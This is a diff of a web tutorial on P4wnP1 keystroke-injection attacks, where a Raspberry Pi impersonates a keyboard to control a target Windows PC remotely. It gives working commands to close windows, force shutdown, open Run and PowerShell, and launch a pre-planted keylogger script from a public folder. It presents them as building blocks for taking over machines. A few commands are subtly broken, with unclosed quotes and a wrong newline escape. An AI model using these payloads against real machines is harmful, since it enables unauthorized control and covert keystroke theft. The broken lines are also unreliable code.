@@ -11,48 +11,40 @@ https://youtu.be/km81ph7pZz8?si=c6gQug7L4YSAEs9_
 
 <h3>Close window</h3>
 <p>Simply use short cut key to terminate the active task / window.</p>
-<pre><code>
-P4wnP1_cli hid run -c 'press("ALT F4)'
+<pre><code>P4wnP1_cli hid run -c 'press("ALT F4)'
 </code></pre>
 
 <h3>Shutdown windows system</h3>
 <p>Use keyboard shortcuts to power off the system. Best done when user is not active on the keyboard. The target may interupt the steps and misfire the payload.</p>
 <p>Navigates the shutdown options with human level delays.</p>
-<pre><code>
-P4wnP1_cli hid run -c 'press("CTRL ALT DELETE"); delay(1000); press("UP"); delay(500); press("ENTER"); delay(500); press("UP"); delay(500); press("UP"); delay(500); press("ENTER"); delay(500); press("ENTER");'
+<pre><code>P4wnP1_cli hid run -c 'press("CTRL ALT DELETE"); delay(1000); press("UP"); delay(500); press("ENTER"); delay(500); press("UP"); delay(500); press("UP"); delay(500); press("ENTER"); delay(500); press("ENTER");'
 </code></pre>
 
 <h3>Open Run</h3>
 <p>Use Windows and R key to open up the prompt to run applications and tasks.</p>
-<pre><code>
-P4wnP1_cli hid run -c 'press("WIN R");'
+<pre><code>P4wnP1_cli hid run -c 'press("WIN R");'
 </code></pre>
 <p>In theory we can open apps without the need for a mouse - all remotely.</p>
-<pre><code>
-P4wnP1_cli hid run -c 'press("WIN R");delay(500);type("notepad.exe\n");press("ENTER");delay(1000);type("This is a test! Payload here!");'
+<pre><code>P4wnP1_cli hid run -c 'press("WIN R");delay(500);type("notepad.exe\n");press("ENTER");delay(1000);type("This is a test! Payload here!");'
 </code></pre>
 
 <h3>Open Powershell</h3>
 <p>Use run to open powershell and type payloads.</p>
-<pre><code>
-P4wnP1_cli hid run -c 'press("WIN R"); delay(500); type("powershell/n); press("ENTER");'
+<pre><code>P4wnP1_cli hid run -c 'press("WIN R"); delay(500); type("powershell/n); press("ENTER");'
 </code></pre>
 
 <h2>How to use forward slash.</h2>
 <p>The forward slash is essential. It allows you to locate files and execute payloads on a windows system.</p>
 <p>It is important to note that the payloads rely heavily on the targets keyboard layout. Whilst this is changeable via HID script code, I had countless issues on finding a solution that worked for me.</p>
 <p>After hours of trial and error, payloads on a UK/GB keyboards require some adjustment to enusre that we can enter a forward slash.</p>
-<pre><code>
-/
+<pre><code>/
 </code></pre>
 <p>The easist way was to ensure that you are using a UK layout.</p>
-<pre><code>
-P4wnP1_cli hid run -c 'layout("gb");'
+<pre><code>P4wnP1_cli hid run -c 'layout("gb");'
 </code></pre>
 <p>Using "|" will NOT work. Atleast in my tests...</p>
 <p>The short cut key below is a working alternative.</p>
-<pre><code>
-P4wnP1_cli hid run -c 'layout("gb");press("RIGHT_ALT #");'
+<pre><code>P4wnP1_cli hid run -c 'layout("gb");press("RIGHT_ALT #");'
 </code></pre>
 <p>Note that this is a method for remotely activating the keys for forward slash, rather than use a type command (which gets mistaken for code) - so be sure you're on a typable field when executing a payload.</p>
 
@@ -60,8 +52,7 @@ P4wnP1_cli hid run -c 'layout("gb");press("RIGHT_ALT #");'
 <p>This payload uses powershell to activate an external powershell script (pre-made pre-injected payload) in the specified planted location.</p>
 <p>It executes a payload (keylogger.ps1) in the planted location 'C:\Users\Public\keylogger.ps1'</p>
 
-<pre><code>
-P4wnP1_cli hid run -c '
+<pre><code>P4wnP1_cli hid run -c '
 layout("gb");
 press("WIN R"); delay(500);
 type("powershell\n"); press("ENTER"); delay(1000);
@@ -70,14 +61,12 @@ type("Users"); press("RIGHT_ALT #");
 type("Public"); press("RIGHT_ALT #");
 type("keylogger.ps1\n");
 press("ENTER");
-'
-</code></pre>
+'</code></pre>
 
 <h2>The Formula!</h2>
 <p>As we can see, these three commands will be the bread and butter to writing payloads</p>
 
-<pre><code>
-#to talk to the raspberry pi
+<pre><code>#to talk to the raspberry pi
 P4wnP1_cli hid run -c '[add commands]'
   
 layout("");
@@ -87,8 +76,7 @@ type("");
 press("");
 
 #milliseconds
-delay(1000);
-</code></pre>
+delay(1000);</code></pre>
 
 <h2>Why is this important?</h2>
 <p>We used a multitude of commands to help build a payload that schedules simulated-keyboard-strokes to take control over a target machine, without being in the seat.</p>
